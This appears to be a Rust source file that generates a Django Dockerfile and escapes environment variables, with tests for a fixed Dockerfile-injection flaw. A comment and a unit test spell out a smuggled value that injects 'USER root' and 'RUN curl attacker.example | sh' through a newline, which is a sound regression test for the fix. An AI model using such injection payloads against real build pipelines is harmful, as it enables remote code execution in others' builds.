pub struct DjangoDockerfile {
    pub environment_vars: Vec<(String, String)>,
}

/// True if `key` is a usable environment variable name.
///
/// Keys are attacker-supplied and were interpolated into the generated
/// Dockerfile unescaped, so a key could introduce arbitrary directives.
fn is_valid_env_key(key: &str) -> bool {
    !key.is_empty()
        && key
            .chars()
            .next()
            .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Renders a value as a double-quoted Dockerfile string.
///
/// A value containing a newline used to inject Dockerfile directives -- `USER
/// root`, `RUN curl ... | sh`, additional build stages -- into the generated
/// file. Combined with the environment endpoints, which did not authorize the
/// caller, that meant executing code inside another project's build.
fn quote_env_value(value: &str) -> String {
    let mut quoted = String::with_capacity(value.len() + 2);
    quoted.push('"');
    for c in value.chars() {
        match c {
            '\\' => quoted.push_str("\\\\"),
            '"' => quoted.push_str("\\\""),
            '\n' => quoted.push_str("\\n"),
            '\r' => quoted.push_str("\\r"),
            '\t' => quoted.push_str("\\t"),
            c => quoted.push(c),
        }
    }
    quoted.push('"');
    quoted
}

impl DjangoDockerfile {
    pub fn new() -> Self {
        Self {
            environment_vars: Vec::new(),
        }
    }

    pub fn with_environment(mut self, env_vars: Vec<(String, String)>) -> Self {
        self.environment_vars = env_vars;
        self
    }

    pub fn generate(&self) -> String {
        let mut dockerfile = String::from(
            r#"
# Multi-stage build for smaller image
FROM python:3.13-alpine AS builder

WORKDIR /app

# Install build dependencies
RUN apk add --no-cache gcc musl-dev

# Install Python packages
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Runtime stage
FROM python:3.13-alpine AS runtime

WORKDIR /app

# Copy Python packages from builder
COPY --from=builder /usr/local/lib/python3.13/site-packages /usr/local/lib/python3.13/site-packages
COPY --from=builder /usr/local/bin /usr/local/bin

# Copy app
COPY . .
"#,
        );

        // Add environment variables
        let usable: Vec<&(String, String)> = self
            .environment_vars
            .iter()
            .filter(|(key, _)| {
                let valid = is_valid_env_key(key);
                if !valid {
                    tracing::warn!(%key, "Skipping environment variable with unusable name");
                }
                valid
            })
            .collect();

        if !usable.is_empty() {
            dockerfile.push_str("\n# Environment variables\n");
            for (key, value) in usable {
                dockerfile.push_str(&format!("ENV {}={}\n", key, quote_env_value(value)));
            }
        }

        dockerfile.push_str(r#"
# Production setup
EXPOSE 80

# Django production server
CMD ["sh", "-c", "\
    python manage.py migrate --noinput; \
    WSGI_MODULE=$(python -c \"import glob; files = glob.glob('*/wsgi.py'); print(files[0].split('/')[0] if files else 'wsgi')\"); \
    gunicorn --bind 0.0.0.0:80 --workers 2 $WSGI_MODULE.wsgi:application"]
"#);

        dockerfile
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rejects_unusable_env_keys() {
        assert!(is_valid_env_key("SECRET_KEY"));
        assert!(is_valid_env_key("_private"));
        assert!(!is_valid_env_key(""));
        assert!(!is_valid_env_key("1BAD"));
        assert!(!is_valid_env_key("HAS SPACE"));
        assert!(!is_valid_env_key("HAS\nNEWLINE"));
    }

    #[test]
    fn newlines_cannot_introduce_directives() {
        let generated = DjangoDockerfile::new()
            .with_environment(vec![(
                "EVIL".to_string(),
                "x\nUSER root\nRUN curl attacker.example | sh".to_string(),
            )])
            .generate();

        assert!(generated.contains("ENV EVIL="));
        // The payload survives as data on one line, not as directives.
        assert!(!generated.contains("\nUSER root"));
        assert!(!generated.contains("\nRUN curl"));
    }

    #[test]
    fn quotes_are_escaped() {
        assert_eq!(quote_env_value("a\"b"), "\"a\\\"b\"");
        assert_eq!(quote_env_value("back\\slash"), "\"back\\\\slash\"");
    }
}
